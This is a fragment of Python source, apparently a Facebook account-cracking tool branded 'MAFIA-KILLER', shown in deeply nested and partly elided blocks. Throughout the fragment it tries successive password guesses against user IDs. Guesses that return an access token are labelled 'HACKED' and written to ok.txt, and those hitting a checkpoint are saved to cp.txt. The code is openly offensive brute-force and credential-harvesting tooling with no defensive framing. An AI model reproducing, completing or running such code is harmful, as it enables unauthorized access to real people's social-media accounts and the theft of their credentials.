                                                                                                                                                ...
                                                                                                                                                if 'access_token' in d:
                                                                                                                                                    ...
                                                                                                                                                    if 'www.facebook.com' in d['error_msg']:
                                                                                                                                                        ...
                                                                                                                                                        if 'access_token' in d:
                                                                                                                                                            ...
                                                                                                                                                            d=json.loads(q)
                                                                                                                                                            if 'www.facebook.com' in d['error_msg']:
                                                                                                                                                                print("[CP-MAFIA-KILLER] "+uid+" | "+pass18)
                                                                                                                                                                cp=open("cp.txt","a")
                                                                                                                                                                cp.write(uid+" | "+pass18+"\n")
                                                                                                                                                                cp.close()
                                                                                                                                                                cps.append(uid)
                                                                                                                                                                ...
                                                                                                                                                                if 'access_token' in d:
                                                                                                                                                                    print("\x1b[1;92m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass18+"\x1b[1;0m")
                                                                                                                                                                    ok=open("ok.txt","a")
                                                                                                                                                                    ok.write(uid+" | "+pass18+"\n")
                                                                                                                                                                    ok.close()
                                                                                                                                                                    oks.append(uid)
                                                                                                                                                                    ...
                                                                                                                                                                    d=json.loads(q)
                                                                                                                                                                    if 'www.facebook.com' in d['error_msg']:
                                                                                                                                                                        print("[CP-MAFIA-KILLER] "+uid+" | "+pass19)
                                                                                                                                                                        cp=open("cp.txt","a")
                                                                                                                                                                        cp.write(uid+" | "+pass19+"\n")
                                                                                                                                                                        cp.close()
                                                                                                                                                                        cps.append(uid)
                                                                                                                                                                        ...
                                                                                                                                                                        if 'access_token' in d:
                                                                                                                                                                            print("\x1b[1;92m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass19+"\x1b[1;0m")
                                                                                                                                                                            ok=open("ok.txt","a")
                                                                                                                                                                            ok.write(uid+" | "+pass19+"\n")
                                                                                                                                                                            ok.close()
                                                                                                                                                                            oks.append(uid)
                                                                                                                                                                            ...
                                                                                                                                                                            d=json.loads(q)
                                                                                                                                                                            if 'www.facebook.com' in d['error_msg']:
                                                                                                                                                                                print("[CP-MAFIA-KILLER] "+uid+" | "+pass20)
                                                                                                                                                                                cp=open("cp.txt","a")
                                                                                                                                                                                cp.write(uid+" | "+pass20+"\n")
                                                                                                                                                                                cp.close()
                                                                                                                                                                                cps.append(uid)
                                                                                                                                                                                ...
                                                                                                                                                                                if 'access_token' in d:
                                                                                                                                                                                    print("\x1b[1;92m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass20+"\x1b[1;0m")
                                                                                                                                                                                    ok=open("ok.txt","a")
                                                                                                                                                                                    ok.write(uid+" | "+pass20+"\n")
                                                                                                                                                                                    ok.close()
                                                                                                                                                                                    oks.append(uid)
